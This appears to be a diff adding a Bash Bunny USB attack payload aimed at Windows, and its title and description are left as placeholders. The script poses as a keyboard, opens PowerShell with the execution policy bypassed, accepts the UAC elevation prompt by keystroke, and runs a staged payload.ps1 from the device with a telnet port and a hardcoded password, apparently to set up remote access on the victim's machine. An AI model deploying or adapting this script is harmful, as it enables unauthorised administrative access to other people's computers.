@@ -1,0 +1,89 @@
+#!/bin/bash
+#
+# Title:            ...
+#
+# Description:
+#                   1) ...
+#                   2) ...
+#                   3) ...
+#
+# Author:           TW-D
+# Version:          1.0
+# Category:         General
+# Target:           Microsoft Windows
+# Attackmodes:      HID STORAGE
+#
+# TESTED ON
+# ===============
+# Microsoft Windows 10 ... Version ... (PowerShell ...)
+#
+# NOTE
+# ===============
+# The target user must belong to the 'Administrator' group.
+#
+# STATUS
+# ===============
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. ATTACK
+# Yellow double blink ............................. STAGE2
+# Yellow triple blink ............................. STAGE3
+# White fast blink ................................ CLEANUP
+# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
+#
+
+######## INITIALIZATION ########
+
+readonly BB_LABEL="BashBunny"
+readonly TELNET_PORT="44423"
+readonly TELNET_PASSWORD="VLC_T3LN3T"
+
+######## SETUP ########
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+######## ATTACK ########
+
+LED ATTACK
+
+Q GUI r
+Q DELAY 3000
+Q STRING "powershell -NoLogo -NoProfile -ExecutionPolicy Bypass"
+Q DELAY 1500
+Q CTRL-SHIFT ENTER
+Q DELAY 3000
+Q LEFTARROW
+Q DELAY 3000
+Q ENTER
+Q DELAY 3000
+
+LED STAGE2
+
+Q STRING "\$BB_VOLUME = \"\$((Get-WmiObject -Class Win32_Volume -Filter \"Label LIKE '${BB_LABEL}'\").Name)payloads\\${SWITCH_POSITION}\\\""
+Q ENTER
+Q DELAY 2000
+
+Q STRING "CD \"\${BB_VOLUME}\""
+Q ENTER
+Q DELAY 1500
+
+LED STAGE3
+
+Q STRING ".\payload.ps1 -TELNET_PORT \"${TELNET_PORT}\" -TELNET_PASSWORD \"${TELNET_PASSWORD}\""
+Q ENTER
+
+######## CLEANUP ########
+
+LED CLEANUP
+
+sync
+
+######## FINISH ########
+
+LED FINISH
+
+# The Bash Bunny automatically turns off after.
+#
+# shutdown -h 0
